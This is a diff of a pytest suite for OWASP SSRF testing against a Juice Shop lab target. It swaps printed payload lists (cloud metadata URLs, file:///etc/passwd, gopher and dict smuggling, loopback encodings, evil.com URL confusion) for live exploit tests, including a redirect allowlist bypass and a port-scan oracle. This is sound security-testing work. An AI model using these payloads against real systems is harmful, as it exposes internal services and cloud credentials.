@@ -1,252 +1,195 @@
 """
 OWASP A10:2021 - Server-Side Request Forgery (SSRF) Tests
 
-Tests for detecting SSRF vulnerabilities including:
-- URL parameter manipulation
-- Internal service access
-- Cloud metadata access
-- Protocol smuggling
+Target: Juice Shop profile-image-by-URL (POST /profile/image/url). The server
+fetch()es the URL and stores the body as the user's avatar, so fetching an
+internal-only URL and then downloading the avatar proves server-side access.
+
+INTERNAL is the address *inside* the Juice Shop container (port 3000),
+independent of the host port mapping (3100 locally, 3000 in CI).
 
 Reference: https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
 """
+
+import time
+from dataclasses import dataclass
 
 import pytest
 import requests
 
 pytestmark = pytest.mark.ssrf
 
+INTERNAL = "http://localhost:3000"
+INTERNAL_SECRET_PATH = "/rest/admin/application-version"  # returns {"version": ...}
+REDIRECT_ALLOWLISTED = "https://github.com/juice-shop/juice-shop"
+
+
+@dataclass
+class SSRFResult:
+    status: int
+    profile_image: str
+    body: str  # stored avatar content if the server fetched the URL, else ""
+
+    @property
+    def fetched(self):
+        return self.profile_image.startswith("/assets/public/images/uploads/")
+
+
+class SSRFClient:
+    """Fresh Juice Shop user whose avatar is set from a URL (one user per test)."""
+
+    def __init__(self, base_url):
+        self.base_url = base_url
+        email, password = f"ssrf{time.time_ns()}@test.com", "TestPass123!"
+        requests.post(
+            f"{base_url}/api/Users/",
+            json={
+                "email": email,
+                "password": password,
+                "passwordRepeat": password,
+                "securityQuestion": {"id": 1},
+                "securityAnswer": "ssrf",
+            },
+            timeout=10,
+        )
+        login = requests.post(
+            f"{base_url}/rest/user/login",
+            json={"email": email, "password": password},
+            timeout=10,
+        )
+        login.raise_for_status()
+        self.token = login.json()["authentication"]["token"]
+        who = requests.get(
+            f"{base_url}/rest/user/whoami", cookies={"token": self.token}, timeout=10
+        )
+        self.user_id = who.json()["user"]["id"]
+
+    def fetch(self, url):
+        resp = requests.post(
+            f"{self.base_url}/profile/image/url",
+            data={"imageUrl": url},
+            cookies={"token": self.token},  # route reads req.cookies.token
+            allow_redirects=False,
+            timeout=60,
+        )
+        user = requests.get(
+            f"{self.base_url}/api/Users/{self.user_id}",
+            headers={"Authorization": f"Bearer {self.token}"},
+            timeout=10,
+        ).json()["data"]
+        image = user["profileImage"]
+        body = ""
+        if image.startswith("/assets/public/images/uploads/"):
+            body = requests.get(f"{self.base_url}{image}", timeout=10).text
+        return SSRFResult(resp.status_code, image, body)
+
+
+@pytest.fixture
+def ssrf(config):
+    try:
+        requests.get(config.JUICE_SHOP_URL, timeout=5)
+    except requests.RequestException:
+        pytest.skip("Juice Shop not available")
+    return SSRFClient(config.JUICE_SHOP_URL)
+
+
+def _leaked_internal(result):
+    return result.fetched and '"version"' in result.body
+
 
 class TestSSRFBasic:
     """Basic SSRF vulnerability tests."""
 
-    @pytest.mark.skip(reason="Conceptual: DVWA has no SSRF-vulnerable endpoint")
-    def test_url_parameter_ssrf(self, dvwa_session, config):
+    def test_url_parameter_ssrf(self, ssrf):
+        """SEC-SSRF-001: imageUrl pointing at an internal-only endpoint is fetched server-side."""
+        result = ssrf.fetch(f"{INTERNAL}{INTERNAL_SECRET_PATH}")
+        assert _leaked_internal(
+            result
+        ), f"Expected SSRF to internal endpoint, got {result}"
+
+    def test_ssrf_via_redirect(self, ssrf):
+        """SEC-SSRF-002: open redirect allowlist bypass chained into SSRF.
+
+        /redirect only checks that `to` *contains* an allowlisted URL, so an
+        internal target with the allowlisted URL as a query string passes and
+        the server's fetch() follows the redirect.
         """
-        Test for SSRF via URL parameters.
-
-        ID: SEC-SSRF-001
-        Applications fetching URLs should validate destinations.
-        """
-        if dvwa_session is None:
-            pytest.skip("DVWA not available")
-
-        # DVWA doesn't have a direct SSRF vulnerable endpoint
-        # This is a conceptual test showing SSRF payloads
-
-        ssrf_payloads = [
-            "http://127.0.0.1",
-            "http://localhost",
-            "http://[::1]",
-            "http://0.0.0.0",
-            "http://0177.0.0.1",  # Octal
-            "http://2130706433",  # Decimal
-            "http://0x7f.0x0.0x0.0x1",  # Hex
-        ]
-
-        print("\n=== SSRF Payload Examples ===")
-        for payload in ssrf_payloads:
-            print(f"  {payload}")
-
-        print("\n[*] Test endpoints that accept URLs:")
-        print("  - Image fetchers")
-        print("  - PDF generators")
-        print("  - Webhook URLs")
-        print("  - Import from URL features")
-
-    @pytest.mark.skip(reason="Conceptual: documents open redirect payloads for SSRF chaining")
-    def test_ssrf_via_redirect(self, http_session, config):
-        """
-        Test SSRF via open redirect.
-
-        ID: SEC-SSRF-002
-        Open redirects can be chained with SSRF.
-        """
-        # Test for open redirect (often chained with SSRF)
-        redirect_payloads = [
-            f"{config.TARGET_URL}?redirect=http://evil.com",
-            f"{config.TARGET_URL}?url=http://127.0.0.1",
-            f"{config.TARGET_URL}?next=http://localhost",
-        ]
-
-        print("\n=== Open Redirect Payloads (SSRF Chain) ===")
-        for payload in redirect_payloads:
-            print(f"  {payload}")
+        chained = f"{INTERNAL}/redirect?to={INTERNAL}{INTERNAL_SECRET_PATH}?x={REDIRECT_ALLOWLISTED}"
+        result = ssrf.fetch(chained)
+        assert _leaked_internal(result), f"Expected redirect-chained SSRF, got {result}"
 
 
 class TestInternalServiceAccess:
-    """Tests for internal service access via SSRF."""
+    """Internal network reachability via SSRF."""
 
-    @pytest.mark.skip(reason="Conceptual: documents cloud metadata endpoints for SSRF targeting")
-    def test_cloud_metadata_endpoints(self):
+    def test_cloud_metadata_endpoints(self, ssrf):
+        """SEC-SSRF-003: link-local metadata address is not blocked by input validation.
+
+        No metadata service exists in CI, so the fetch itself fails; the finding
+        is that the server *attempts* it (request accepted, URL stored as-is)
+        instead of rejecting 169.254.0.0/16 before fetching.
         """
-        Test for cloud metadata endpoint access.
+        url = "http://169.254.169.254/latest/meta-data/"
+        result = ssrf.fetch(url)
+        assert (
+            result.status == 302 and result.profile_image == url
+        ), f"Expected metadata URL to be accepted without validation, got {result}"
 
-        ID: SEC-SSRF-003
-        Cloud metadata endpoints should be blocked.
-        """
-        # Cloud metadata endpoints
-        metadata_endpoints = {
-            "AWS": "http://169.254.169.254/latest/meta-data/",
-            "GCP": "http://metadata.google.internal/computeMetadata/v1/",
-            "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-            "DigitalOcean": "http://169.254.169.254/metadata/v1/",
-        }
-
-        print("\n=== Cloud Metadata Endpoints (SSRF Targets) ===")
-        for cloud, endpoint in metadata_endpoints.items():
-            print(f"  {cloud}: {endpoint}")
-
-        print("\n[*] SSRF to these endpoints can leak:")
-        print("  - IAM credentials")
-        print("  - Instance identity")
-        print("  - Network configuration")
-
-    @pytest.mark.skip(reason="Conceptual: documents internal service ports for SSRF scanning")
-    def test_internal_service_ports(self):
-        """
-        Test for internal service port access.
-
-        ID: SEC-SSRF-004
-        SSRF can be used to scan internal ports.
-        """
-        internal_services = {
-            "Redis": "127.0.0.1:6379",
-            "MySQL": "127.0.0.1:3306",
-            "PostgreSQL": "127.0.0.1:5432",
-            "MongoDB": "127.0.0.1:27017",
-            "Elasticsearch": "127.0.0.1:9200",
-            "Memcached": "127.0.0.1:11211",
-        }
-
-        print("\n=== Internal Services (SSRF Targets) ===")
-        for service, endpoint in internal_services.items():
-            print(f"  {service}: http://{endpoint}")
+    def test_internal_service_ports(self, ssrf):
+        """SEC-SSRF-004: SSRF acts as an internal port-scan oracle (open vs closed)."""
+        open_port = ssrf.fetch(f"{INTERNAL}{INTERNAL_SECRET_PATH}")
+        closed_port = ssrf.fetch("http://127.0.0.1:1/")
+        assert (
+            open_port.fetched and not closed_port.fetched
+        ), f"Expected distinguishable open/closed ports, got open={open_port} closed={closed_port}"
 
 
 class TestProtocolSmuggling:
-    """Tests for protocol smuggling via SSRF."""
+    """Non-HTTP schemes: Node fetch() only supports http(s), so these are NOT exploitable."""
 
-    @pytest.mark.skip(reason="Conceptual: documents file:// protocol payloads for SSRF")
-    def test_file_protocol(self):
-        """
-        Test for file:// protocol access.
-
-        ID: SEC-SSRF-005
-        File protocol can read local files.
-        """
-        file_payloads = [
-            "file:///etc/passwd",
-            "file:///etc/hosts",
-            "file:///proc/self/environ",
-            "file:///var/log/apache2/access.log",
-        ]
-
-        print("\n=== File Protocol Payloads ===")
-        for payload in file_payloads:
-            print(f"  {payload}")
-
-    @pytest.mark.skip(reason="Conceptual: documents gopher:// protocol smuggling for SSRF")
-    def test_gopher_protocol(self):
-        """
-        Test for gopher:// protocol smuggling.
-
-        ID: SEC-SSRF-006
-        Gopher protocol can be used for protocol smuggling.
-        """
-        # Gopher protocol allows sending arbitrary data to services
-        gopher_examples = [
-            "gopher://127.0.0.1:6379/_PING",  # Redis
-            "gopher://127.0.0.1:25/_HELO",  # SMTP
-        ]
-
-        print("\n=== Gopher Protocol Examples ===")
-        for example in gopher_examples:
-            print(f"  {example}")
-
-        print("\n[*] Gopher can send arbitrary TCP data")
-
-    @pytest.mark.skip(reason="Conceptual: documents dict:// protocol payloads for SSRF")
-    def test_dict_protocol(self):
-        """
-        Test for dict:// protocol access.
-
-        ID: SEC-SSRF-007
-        Dict protocol can leak information.
-        """
-        dict_payloads = [
-            "dict://127.0.0.1:6379/INFO",
-            "dict://127.0.0.1:11211/stats",
-        ]
-
-        print("\n=== Dict Protocol Payloads ===")
-        for payload in dict_payloads:
-            print(f"  {payload}")
+    @pytest.mark.parametrize(
+        "url",
+        [
+            pytest.param("file:///etc/passwd", id="file"),
+            pytest.param("gopher://127.0.0.1:6379/_INFO", id="gopher"),
+            pytest.param("dict://127.0.0.1:11211/stat", id="dict"),
+        ],
+    )
+    def test_non_http_scheme_not_fetched(self, ssrf, url):
+        """SEC-SSRF-005/006/007: file:// gopher:// dict:// are rejected by fetch()."""
+        result = ssrf.fetch(url)
+        assert (
+            not result.fetched and "root:" not in result.body
+        ), f"{url} should not be fetched, got {result}"
 
 
 class TestSSRFBypass:
-    """Tests for SSRF filter bypasses."""
+    """Filter-bypass techniques."""
 
-    @pytest.mark.skip(reason="Conceptual: documents IP encoding techniques for SSRF filter bypass")
-    def test_ip_encoding_bypass(self):
+    def test_ip_encoding_bypass(self, ssrf):
+        """SEC-SSRF-008: decimal-encoded loopback (2130706433 == 127.0.0.1) reaches internal endpoint."""
+        result = ssrf.fetch(f"http://2130706433:3000{INTERNAL_SECRET_PATH}")
+        assert _leaked_internal(result), f"Expected decimal-IP SSRF, got {result}"
+
+    def test_dns_rebinding(self, ssrf):
+        """SEC-SSRF-009: hostname resolving to loopback reaches internal endpoint.
+
+        The server trusts the hostname and never checks the resolved IP - the
+        precondition DNS rebinding relies on. Uses public wildcard DNS (nip.io).
         """
-        Test IP encoding techniques for filter bypass.
+        result = ssrf.fetch(f"http://127.0.0.1.nip.io:3000{INTERNAL_SECRET_PATH}")
+        assert _leaked_internal(
+            result
+        ), f"Expected DNS-based loopback SSRF, got {result}"
 
-        ID: SEC-SSRF-008
-        Various IP encodings can bypass blocklists.
-        """
-        # Different representations of 127.0.0.1
-        ip_encodings = {
-            "Standard": "127.0.0.1",
-            "Decimal": "2130706433",
-            "Octal": "0177.0.0.1",
-            "Hex": "0x7f.0x0.0x0.0x1",
-            "Mixed": "0x7f.0.0.1",
-            "IPv6": "[::1]",
-            "IPv6 Mapped": "[::ffff:127.0.0.1]",
-            "Shortened": "127.1",
-        }
-
-        print("\n=== IP Encoding Bypasses ===")
-        for name, ip in ip_encodings.items():
-            print(f"  {name}: http://{ip}")
-
-    @pytest.mark.skip(reason="Conceptual: documents DNS rebinding attack concept")
-    def test_dns_rebinding(self):
-        """
-        Test DNS rebinding concept.
-
-        ID: SEC-SSRF-009
-        DNS rebinding can bypass IP-based filters.
-        """
-        print("\n=== DNS Rebinding Attack ===")
-        print("1. Attacker controls DNS for evil.com")
-        print("2. First DNS query returns attacker IP (passes validation)")
-        print("3. TTL is very short")
-        print("4. Second DNS query returns 127.0.0.1 (actual request)")
-        print("5. Server makes request to internal IP")
-
-        print("\n[*] Mitigation: Validate IP at request time, not just hostname")
-
-    @pytest.mark.skip(reason="Conceptual: documents URL parsing confusion techniques for SSRF")
-    def test_url_parsing_confusion(self):
-        """
-        Test URL parsing confusion.
-
-        ID: SEC-SSRF-010
-        Different URL parsers may interpret URLs differently.
-        """
-        confusion_payloads = [
-            "http://evil.com@127.0.0.1/",
-            "http://127.0.0.1#@evil.com/",
-            "http://127.0.0.1:80@evil.com/",
-            "http://evil.com\\@127.0.0.1/",
-        ]
-
-        print("\n=== URL Parsing Confusion ===")
-        for payload in confusion_payloads:
-            print(f"  {payload}")
-
-        print("\n[*] Different parsers may extract different hosts")
+    def test_url_parsing_confusion(self, ssrf):
+        """SEC-SSRF-010: userinfo confusion (attacker@internal) is rejected by fetch() - not exploitable."""
+        result = ssrf.fetch(
+            f"http://trusted.example@127.0.0.1:3000{INTERNAL_SECRET_PATH}"
+        )
+        assert (
+            not result.fetched
+        ), f"URL with credentials should be rejected by fetch(), got {result}"
 
 
 class TestJuiceShopSSRF:
@@ -279,7 +222,9 @@ class TestJuiceShopSSRF:
             except requests.RequestException:
                 pass
 
-        assert len(reachable) > 0, "At least one Juice Shop API endpoint should be reachable"
+        assert (
+            len(reachable) > 0
+        ), "At least one Juice Shop API endpoint should be reachable"
 
     def test_juice_shop_redirect(self, juice_shop_session, config):
         """
@@ -312,6 +257,6 @@ class TestJuiceShopSSRF:
         else:
             print("[*] No redirect behavior detected")
 
-        assert "localhost" not in location and "127.0.0.1" not in location, (
-            "Redirect should not allow access to internal addresses"
-        )
+        assert (
+            "localhost" not in location and "127.0.0.1" not in location
+        ), "Redirect should not allow access to internal addresses"
